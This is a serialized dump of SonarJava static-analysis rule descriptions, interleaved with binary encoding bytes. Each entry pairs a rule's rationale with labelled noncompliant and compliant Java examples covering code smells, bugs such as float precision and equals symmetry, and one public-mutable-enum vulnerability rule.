javaS1199%Nested code blocks should not be used"MINOR*java:ﬂ<p>Nested code blocks can be used to create a new scope and restrict the visibility of the variables defined inside it. Using this feature in a method
typically indicates that the method has too many responsibilities, and should be refactored into smaller methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD: {                                // Noncompliant - nested code block '{' ... '}'
        int a = stack.pop();
        int b = stack.pop();
        int result = a + b;
        stack.push(result);
        break;
      }
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void evaluate(int operator) {
  switch (operator) {
    /* ... */
    case ADD:                                  // Compliant
      evaluateAdd();
      break;
    /* ... */
  }
}

private void evaluateAdd() {
  int a = stack.pop();
  int b = stack.pop();
  int result = a + b;
  stack.push(result);
}
</pre>Z
CODE_SMELL
·

java:S2167“
javaS21671"compareTo" should not return "Integer.MIN_VALUE""MINOR*java:˝<p>It is the sign, rather than the magnitude of the value returned from <code>compareTo</code> that matters. Returning <code>Integer.MIN_VALUE</code>
does <em>not</em> convey a higher degree of inequality, and doing so can cause errors because the return value of <code>compareTo</code> is sometimes
inversed, with the expectation that negative values become positive. However, inversing <code>Integer.MIN_VALUE</code> yields
<code>Integer.MIN_VALUE</code> rather than <code>Integer.MAX_VALUE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return Integer.MIN_VALUE;  // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return -1;
  }
</pre>ZBUG
Ñ

java:S1197ı
javaS1197>Array designators "[]" should be on the type, not the variable"MINOR*java:å<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the
variable name to know whether or not a variable is an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int matrix[][];   // Noncompliant
int[] matrix[];   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int[][] matrix;   // Compliant
</pre>Z
CODE_SMELL
¢	

java:S2164ì	
javaS2164&Math should not be performed on floats"MINOR*java:…<p>For small numbers, <code>float</code> math has enough precision to yield the expected value, but for larger numbers, it does not.
<code>BigDecimal</code> is the best alternative, but if a primitive is required, use a <code>double</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
float c = a + b; // Noncompliant; yields 1.6777216E7 not 1.6777217E7

double d = a + b; // Noncompliant; addition is still between 2 floats
</pre>
<h2>Compliant Solution</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
BigDecimal c = BigDecimal.valueOf(a).add(BigDecimal.valueOf(b));

double d = (double)a + (double)b;
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the mathematical expression is only used to build a string.</p>
<pre>
System.out.println("["+getName()+"] " +
           "\n\tMax time to retrieve connection:"+(max/1000f/1000f)+" ms.");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/DgU">CERT, FLP02-C.</a> - Avoid using floating-point numbers when precise computation
  is needed </li>
</ul>ZBUG
ı

java:S3012Ê
javaS3012'Arrays should not be copied using loops"MINOR*java:î<p>Using a loop to copy an array or a subset of an array is simply wasted code when there are built-in functions to do it for you. Instead, use
<code>Arrays.copyOf</code> to copy an entire array into another array, use <code>System.arraycopy</code> to copy only a subset of an array into
another array, and use <code>Arrays.asList</code> to feed the constructor of a new list with an array.</p>
<p>Note that <code>Arrays.asList</code> simply puts a <code>Collections</code> wrapper around the original array, so further steps are required if a
non-fixed-size <code>List</code> is desired.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void makeCopies(String[] source) {

  this.array = new String[source.length];
  this.list = new ArrayList(source.length);

  for (int i = 0; i &lt; source.length; i++) {
    this.array[i] = source[i]; // Noncompliant
  }

  for (String s : source) {
    this.list.add(s); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void makeCopies(String[] source) {
  this.array = Arrays.copyOf(source, source.length);
  Collections.addAll(this.list, source);
}
</pre>
<h2>Exceptions</h2>
<p>Rule detects only the most idiomatic patterns, it will not consider loops with non-trivial control flow. For example, array elements that are
copied conditionally are ignored.</p>
<pre>
public int[] getCopy(int[] source) {
  int[] dest = new int[source.length];
  for (int i = 0; i &lt; source.length; i++) {
    if (source[i] &gt; 10) {
      dest[i] = source[i];  // Compliant
    }
  }
  return dest;
}
</pre>Z
CODE_SMELL
ß

java:S2165ò
javaS2165*"finalize" should not set fields to "null""MINOR*java:√<p>There is no point in setting class fields to <code>null</code> in a finalizer. If this this is a hint to the garbage collector, it is unnecessary -
the object will be garbage collected anyway - and doing so may actually cause extra work for the garbage collector.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String name;

  @Override
  void finalize() {
    name = null;  // Noncompliant; completely unnecessary
</pre>Z
CODE_SMELL
‰

java:S3254’
javaS3254EDefault annotation parameter values should not be passed as arguments"MINOR*java:Â<p>Specifying the default value for an annotation parameter is redundant. Such values should be omitted in the interests of readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@MyAnnotation(arg = "def")  // Noncompliant
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@MyAnnotation
public class MyClass {
  // ...
}
public @interface MyAnnotation {
  String arg() default "def";
}
</pre>Z
CODE_SMELL
˘

java:S1075Í
javaS1075URIs should not be hardcoded"MINOR*java:£<p>Hard coding a URI makes it difficult to test a program: path literals are not always portable across operating systems, a given absolute path may
not exist on a specific test environment, a specified Internet URL may not be available when executing the tests, production environment filesystems
usually differ from the development environment, ...etc. For all those reasons, a URI should never be hard coded. Instead, it should be replaced by
customizable parameter.</p>
<p>Further even if the elements of a URI are obtained dynamically, portability can still be limited if the path-delimiters are hard-coded.</p>
<p>This rule raises an issue when URI's or path delimiters are hard coded.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  public Collection&lt;User&gt; listUsers() {
    File userList = new File("/home/mylogin/Dev/users.txt"); // Non-Compliant
    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  // Configuration is a class that returns customizable properties: it can be mocked to be injected during tests.
  private Configuration config;
  public Foo(Configuration myConfig) {
    this.config = myConfig;
  }
  public Collection&lt;User&gt; listUsers() {
    // Find here the way to get the correct folder, in this case using the Configuration object
    String listingFolder = config.getProperty("myApplication.listingFolder");
    // and use this parameter instead of the hard coded path
    File userList = new File(listingFolder, "users.txt"); // Compliant
    Collection&lt;User&gt; users = parse(userList);
    return users;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>Z
CODE_SMELL
œ

java:S2162¿
javaS2162<"equals" methods should be symmetric and work for subclasses"MINOR*java:‡<p>A key facet of the <code>equals</code> contract is that if <code>a.equals(b)</code> then <code>b.equals(a)</code>, i.e. that the relationship is
symmetric. </p>
<p>Using <code>instanceof</code> breaks the contract when there are subclasses, because while the child is an <code>instanceof</code> the parent, the
parent is not an <code>instanceof</code> the child. For instance, assume that <code>Raspberry extends Fruit</code> and adds some fields (requiring a
new implementation of <code>equals</code>):</p>
<pre>
Fruit fruit = new Fruit();
Raspberry raspberry = new Raspberry();

if (raspberry instanceof Fruit) { ... } // true
if (fruit instanceof Raspberry) { ... } // false
</pre>
<p>If similar <code>instanceof</code> checks were used in the classes' <code>equals</code> methods, the symmetry principle would be broken:</p>
<pre>
raspberry.equals(fruit); // false
fruit.equals(raspberry); //true
</pre>
<p>Additionally, non <code>final</code> classes shouldn't use a hardcoded class name in the <code>equals</code> method because doing so breaks the
method for subclasses. Instead, make the comparison dynamic.</p>
<p>Further, comparing to an unrelated class type breaks the contract for that unrelated type, because while
<code>thisClass.equals(unrelatedClass)</code> can return true, <code>unrelatedClass.equals(thisClass)</code> will not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (Fruit.class == obj.getClass()) { // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    if (obj instanceof Fruit ) {  // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    else if (obj instanceof Season) { // Noncompliant; symmetry broken for Season class
      // ...
    }
    //...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (this.getClass() == obj.getClass()) {
      return ripe.equals(((Fruit)obj).getRipe());
    }
    return false;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zIUbAQ">CERT, MET08-J.</a> - Preserve the equality contract when overriding the
  equals() method </li>
</ul>ZBUG
≈

java:S1195∂
javaS1195LArray designators "[]" should be located after the type in method signatures"MINOR*java:ø<p>According to the Java Language Specification: </p>
<blockquote>
  <p>For compatibility with older versions of the Java SE platform,</p>
  <p>the declaration of a method that returns an array is allowed to place (some or all of) the empty bracket pairs that form the declaration of the
  array type after the formal parameter list.</p>
  <p>This obsolescent syntax should not be used in new code.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public int getVector()[] { /* ... */ }    // Noncompliant

public int[] getMatrix()[] { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public int[] getVector() { /* ... */ }

public int[][] getMatrix() { /* ... */ }
</pre>Z
CODE_SMELL
«

java:S3373∏
javaS3373<"action" mappings should not have too many "forward" entries"MINOR*java:—<p>It makes sense to handle all related actions in the same place. Thus, the same <code>&lt;action&gt;</code> might logically handle all facets of
CRUD on an entity, with no confusion in the naming about which <code>&lt;forward/&gt;</code> handles which facet. But go very far beyond that, and it
becomes difficult to maintain a transparent naming convention. </p>
<p>So to ease maintenance, this rule raises an issue when an <code>&lt;action&gt;</code> has more than the allowed number of
<code>&lt;forward/&gt;</code> tags.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 4:</p>
<pre>
&lt;action path='/book' type='myapp.BookDispatchAction' name='form' parameter='method'&gt;
  &lt;forward name='create' path='/WEB-INF/jsp/BookCreate.jspx' redirect='false'/&gt;
  &lt;forward name='read' path='/WEB-INF/jsp/BookDetails' redirect='false'/&gt;
  &lt;forward name='update' path='/WEB-INF/jsp/BookUpdate.jspx' redirect='false'/&gt;
  &lt;forward name='delete' path='/WEB-INF/jsp/BookDelete.jspx' redirect='false'/&gt;
  &lt;forward name='authorRead' path='WEB-INF/jsp/AuthorDetails' redirect='false'/&gt;  &lt;!-- Noncompliant --&gt;
&lt;/action&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;action path='/book' type='myapp.BookDispatchAction' name='bookForm' parameter='method'&gt;
  &lt;forward name='create' path='/WEB-INF/jsp/BookCreate.jspx' redirect='false'/&gt;
  &lt;forward name='read' path='/WEB-INF/jsp/BookDetails' redirect='false'/&gt;
  &lt;forward name='update' path='/WEB-INF/jsp/BookUpdate.jspx' redirect='false'/&gt;
  &lt;forward name='delete' path='/WEB-INF/jsp/BookDelete.jspx' redirect='false'/&gt;
&lt;/action&gt;

&lt;action path='/author' type='myapp.AuthorDispatchAction' name='authorForm' parameter='method'&gt;
  &lt;forward name='authorRead' path='WEB-INF/jsp/AuthorDetails' redirect='false'/&gt;
&lt;/action&gt;
</pre>Z
CODE_SMELL
˘

java:S2160Í
javaS21603Subclasses that add fields should override "equals""MINOR*java:å<p>Extend a class that overrides <code>equals</code> and add fields without overriding <code>equals</code> in the subclass, and you run the risk of
non-equivalent instances of your subclass being seen as equal, because only the superclass fields will be considered in the equality test.</p>
<p>This rule looks for classes that do all of the following:</p>
<ul>
  <li> extend classes that override <code>equals</code>. </li>
  <li> do not themselves override <code>equals</code>. </li>
  <li> add fields. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {  // Noncompliant; instances will use Fruit's equals method
  private Color ripeColor;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {
  private Color ripeColor;

  public boolean equals(Object obj) {
    if (! super.equals(obj)) {
      return false;
    }
    Raspberry fobj = (Raspberry) obj;
    if (ripeColor.equals(fobj.getRipeColor()) {  // added fields are tested
      return true;
    }
    return false;
  }
}
</pre>Z
CODE_SMELL
î

java:S2059Ö
javaS2059G"Serializable" inner classes of "Serializable" classes should be static"MINOR*java:ì
<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is actually
serializable, then the serialization will succeed but possibly write out far more data than was intended. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public class Drupelet implements Serializable {  // Noncompliant; output may be too large
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public static class Drupelet implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/O4CpAQ">CERT, SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>Z
CODE_SMELL
⁄
	java:S101Ã
javaS1012Class names should comply with a naming convention"MINOR*java:<p>Shared coding conventions allow teams to collaborate effectively. This rule allows to check that all class names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
class my_class {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
</pre>Z
CODE_SMELL
Ÿ
	java:S100À
javaS1003Method names should comply with a naming convention"MINOR*java:Ó<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks that all method names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With default provided regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public int DoSomething(){...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int doSomething(){...}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded. </p>
<pre>
@Override
public int Do_Something(){...}
</pre>Z
CODE_SMELL
‰

java:S2055’
javaS2055`The non-serializable super class of a "Serializable" class should have a no-argument constructor"MINOR*java:—<p>When a <code>Serializable</code> object has a non-serializable ancestor in its inheritance chain, object deserialization (re-instantiating the
object from file) starts at the first non-serializable class, and proceeds down the chain, adding the properties of each subsequent child class, until
the final object has been instantiated. </p>
<p>In order to create the non-serializable ancestor, its no-argument constructor is called. Therefore the non-serializable ancestor of a
<code>Serializable</code> class must have a no-arg constructor. Otherwise the class is <code>Serializable</code> but not deserializable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {  // Noncompliant; nonserializable ancestor doesn't have no-arg constructor
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public Fruit () {...};  // Compliant; no-arg constructor added to ancestor
  public Fruit (Season ripe) {...}
  public void setRipe(Season ripe) {...}
  public Season getRipe() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;

  private String variety;

  public Raspberry(Season ripe, String variety) {...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>ZBUG
ÿ

java:S3020…
javaS30206"toArray" should be passed an array of the proper type"MINOR*java:Ô<p>Given no arguments, the <code>Collections.toArray</code> method returns an <code>Object []</code>, which will cause a
<code>ClassCastException</code> at runtime if you try to cast it to an array of the proper class. Instead, pass an array of the correct type in to the
call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return (String []) strings.toArray();  // Noncompliant; ClassCastException thrown
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return strings.toArray(new String[0]);
}
</pre>ZBUG
‹

java:S2293Õ
javaS2293*The diamond operator ("<>") should be used"MINOR*java:¯<p>Java 7 introduced the diamond operator (<code>&lt;&gt;</code>) to reduce the verbosity of generics code. For instance, instead of having to declare
a <code>List</code>'s type in both its declaration and its constructor, you can now simplify the constructor declaration with <code>&lt;&gt;</code>,
and the compiler will infer the type.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;String&gt;();  // Noncompliant
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;String,List&lt;Integer&gt;&gt;();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;&gt;();
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;();
</pre>Z
CODE_SMELL
¯	

java:S3077È	
javaS3077-Non-primitive fields should not be "volatile""MINOR*java:ò	<p>Marking an array <code>volatile</code> means that the array itself will always be read fresh and never thread cached, but the items <em>in</em> the
array will not be. Similarly, marking a mutable object field <code>volatile</code> means the object <em>reference</em> is <code>volatile</code> but
the object itself is not, and other threads may not see updates to the object state.</p>
<p>This can be salvaged with arrays by using the relevant AtomicArray class, such as <code>AtomicIntegerArray</code>, instead. For mutable objects,
the <code>volatile</code> should be removed, and some other method should be used to ensure thread-safety, such as synchronization, or ThreadLocal
storage.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int [] vInts;  // Noncompliant
private volatile MyObj myObj;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicIntegerArray vInts;
private MyObj myObj;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/twD1AQ">CERT, CON50-J.</a> - Do not assume that declaring a reference volatile
  guarantees safe publication of the members of the referenced object </li>
</ul>ZBUG
Ù

java:S4174Â
javaS4174>Local constants should follow naming conventions for constants"MINOR*java:¸<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all local, <code>final</code>, initialized, primitive
variables, have names that match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
public void doSomething() {
  final int local = 42;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething() {
  final int LOCAL = 42;
  ...
}
</pre>Z
CODE_SMELL
ì

java:S4266Ñ
javaS42660"Stream.collect()" calls should not be redundant"MINOR*java:©<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible to improve readability and maintainability.</p>
<p>This rule raises an issue when one of the following substitution can be made:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.collect(counting())</code></td>
      <td><code>stream.count()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(maxBy(comparator))</code></td>
      <td><code>stream.max(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(minBy(comparator))</code></td>
      <td><code>stream.min(comparator)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(mapping(mapper))</code></td>
      <td><code>stream.map(mapper).collect()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(reducing(...))</code></td>
      <td><code>stream.reduce(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingInt(mapper))</code></td>
      <td><code>stream.mapToInt(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingLong(mapper))</code></td>
      <td><code>stream.mapToLong(mapper).sum()</code></td>
    </tr>
    <tr>
      <td><code>stream.collect(summingDouble(mapper))</code></td>
      <td><code>stream.mapToDouble(mapper).sum()</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
int count = stream.collect(counting());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int count = stream.count();
</pre>Z
CODE_SMELL
®

java:S3052ô
javaS30522Fields should not be initialized to default values"MINOR*java:º<p>The compiler automatically initializes class fields to their default values before setting them with any initialization values, so there is no need
to explicitly set a field to its default value. Further, under the logic that cleaner code is better code, it's considered poor style to do so.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  int count = 0;  // Noncompliant
  // ...

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  int count;
  // ...

}
</pre>
<h2>Exceptions</h2>
<p><code>final</code> fields are ignored.</p>Z
CODE_SMELL
í'

java:S4276É'
javaS4276:Functional Interfaces should be as specialised as possible"MINOR*java:û&<p>The <code>java.util.function</code> package provides a large array of functional interface definitions for use in lambda expressions and method
references. In general it is recommended to use the more specialised form to avoid auto-boxing. For instance <code>IntFunction&lt;Foo&gt;</code>
should be preferred over <code>Function&lt;Integer, Foo&gt;</code>.</p>
<p>This rule raises an issue when any of the following substitution is possible:</p>
<table>
  <tbody>
    <tr>
      <th>Current Interface</th>
      <th>Preferred Interface</th>
    </tr>
    <tr>
      <td><code>Function&lt;Integer, R&gt;</code></td>
      <td><code>IntFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Long, R&gt;</code></td>
      <td><code>LongFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Double, R&gt;</code></td>
      <td><code>DoubleFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;Double,Integer&gt;</code> </td>
      <td> <code>DoubleToIntFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Double,Long&gt;</code> </td>
      <td> <code>DoubleToLongFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Long,Double&gt;</code> </td>
      <td> <code>LongToDoubleFunction</code> </td>
    </tr>
    <tr>
      <td><code>Function&lt;Long,Integer&gt;</code> </td>
      <td> <code>LongToIntFunction</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Integer&gt;</code> </td>
      <td> <code>ToIntFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Long&gt;</code> </td>
      <td> <code>ToLongFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;R,Double&gt;</code> </td>
      <td> <code>ToDoubleFunction&lt;R&gt;</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;T,T&gt;</code> </td>
      <td> <code>UnaryOperator&lt;T&gt;</code> </td>
    </tr>
    <tr>
      <td><code>BiFunction&lt;T,T,T&gt;</code> </td>
      <td> <code>BinaryOperator&lt;T&gt;</code> </td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Integer&gt;</code></td>
      <td><code>IntConsumer</code></td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Double&gt;</code></td>
      <td><code>DoubleConsumer</code></td>
    </tr>
    <tr>
      <td><code>Consumer&lt;Long&gt;</code></td>
      <td><code>LongConsumer</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Integer&gt;</code> </td>
      <td> <code>ObjIntConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Long&gt;</code> </td>
      <td> <code>ObjLongConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiConsumer&lt;T,Double&gt;</code> </td>
      <td> <code>ObjDoubleConsumer&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Integer&gt;</code></td>
      <td><code>IntPredicate</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Double&gt;</code></td>
      <td><code>DoublePredicate</code></td>
    </tr>
    <tr>
      <td><code>Predicate&lt;Long&gt;</code></td>
      <td><code>LongPredicate</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Integer&gt;</code></td>
      <td><code>IntSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Double&gt;</code></td>
      <td><code>DoubleSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Long&gt;</code></td>
      <td><code>LongSupplier</code></td>
    </tr>
    <tr>
      <td><code>Supplier&lt;Boolean&gt;</code> </td>
      <td> <code>BooleanSupplier</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Integer&gt;</code></td>
      <td><code>IntUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Double&gt;</code></td>
      <td><code>DoubleUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>UnaryOperator&lt;Long&gt;</code></td>
      <td><code>LongUnaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Integer&gt;</code> </td>
      <td> <code>IntBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Long&gt;</code> </td>
      <td> <code>LongBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>BinaryOperator&lt;Double&gt;</code> </td>
      <td> <code>DoubleBinaryOperator</code></td>
    </tr>
    <tr>
      <td><code>Function&lt;T, Boolean&gt;</code> </td>
      <td> <code>Predicate&lt;T&gt;</code></td>
    </tr>
    <tr>
      <td><code>BiFunction&lt;T,U,Boolean&gt;</code> </td>
      <td> <code>BiPredicate&lt;T,U&gt;</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo implements Supplier&lt;Integer&gt; {  // Noncompliant
    @Override
    public Integer get() {
      // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo implements IntSupplier {

  @Override
  public int getAsInt() {
    // ...
  }
}
</pre>Z
CODE_SMELL
”

java:S4034ƒ
javaS40347"Stream" call chains should be simplified when possible"MINOR*java:‚
<p>When using the <code>Stream</code> API, call chains should be simplified as much as possible. Not only does it make the code easier to read, it
also avoid creating unnecessary temporary objects.</p>
<p>This rule raises an issue when one of the following substitution is possible:</p>
<table>
  <tbody>
    <tr>
      <th>Original</th>
      <th>Preferred</th>
    </tr>
    <tr>
      <td><code>stream.filter(predicate).findFirst().isPresent()</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>stream.filter(predicate).findAny().isPresent()</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>!stream.anyMatch(predicate)</code></td>
      <td><code>stream.noneMatch(predicate)</code></td>
    </tr>
    <tr>
      <td><code>!stream.anyMatch(x -&gt; !(...))</code></td>
      <td><code>stream.allMatch(...)</code></td>
    </tr>
    <tr>
      <td><code>stream.map(mapper).anyMatch(Boolean::booleanValue)</code></td>
      <td><code>stream.anyMatch(predicate)</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
boolean hasRed = widgets.stream().filter(w -&gt; w.getColor() == RED).findFirst().isPresent(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean hasRed = widgets.stream().anyMatch(w -&gt; w.getColor() == RED);
</pre>Z
CODE_SMELL
‘

java:S3066≈
javaS3066,"enum" fields should not be publicly mutable"MINOR*java:Î<p><code>enum</code>s are generally thought of as constant, but an <code>enum</code> with a <code>public</code> field or <code>public</code> setter is
not only non-constant, but also vulnerable to malicious code. Ideally fields in an <code>enum</code> are <code>private</code> and set in the
constructor, but if that's not possible, their visibility should be reduced as much as possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  public int countryCount;  // Noncompliant
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }

  public void setLandMass(int landMass) {  // Noncompliant
    this.landMass = landMass;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public enum Continent {

  NORTH_AMERICA (23, 24709000),
  // ...
  EUROPE (50, 39310000);

  private int countryCount;
  private int landMass;

  Continent(int countryCount, int landMass) {
    // ...
  }
</pre>ZVULNERABILITY
ü

java:S4032ê
javaS4032>Packages containing only "package-info.java" should be removed"MINOR*java:ß<p>There is no reason to have a package that is empty except for "package-info.java". Such packages merely clutter a project, taking up space but
adding no value. </p>Z
CODE_SMELL
œ

java:S2097¿
javaS2097."equals(Object obj)" should test argument type"MINOR*java:Ó<p>Because the <code>equals</code> method takes a generic <code>Object</code> as a parameter, any type of object may be passed to it. The method
should not assume it will only be used to test objects of its class type. It must instead check the parameter's type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean equals(Object obj) {
  MyClass mc = (MyClass)obj;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
